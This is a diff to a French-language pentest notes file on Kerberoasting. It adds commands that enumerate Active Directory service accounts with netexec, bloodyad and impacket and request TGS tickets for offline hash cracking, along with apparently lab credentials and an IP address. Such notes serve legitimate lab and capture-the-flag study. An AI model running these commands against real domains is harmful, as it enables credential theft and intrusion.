@@ -73,13 +73,18 @@ TGS → hash crackable
 
 
 ```bash
-# Decouvrir si des SPN existe 
+### AVEC DES CREDENTIALS  ##
+
+# Enumérer les comptes avec netexec
 netexec ldap <DC_IP> -u '<USER>' -p '<PASS>' --query "(servicePrincipalName=*)" "sAMAccountName servicePrincipalName"
 
-### AVEC DES CREDENTIALS  ##
-# Enumérer les comptes avec un SPN  
-GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip DC_IP
+# Enumérer les comptes avec bloodyad
+bloodyad -d delegate.vl --dc-ip 10.129.234.69 -u 'N.Thompson' -p 'KALEB_2341' get object 'PwnPC$' --attr 'servicePrincipalName'
+
+
+# Enumérer les comptes avec impacket 
 impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>
+
 
 ## Récupérer le ticket TGS du compte
 impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip DC_IP -request
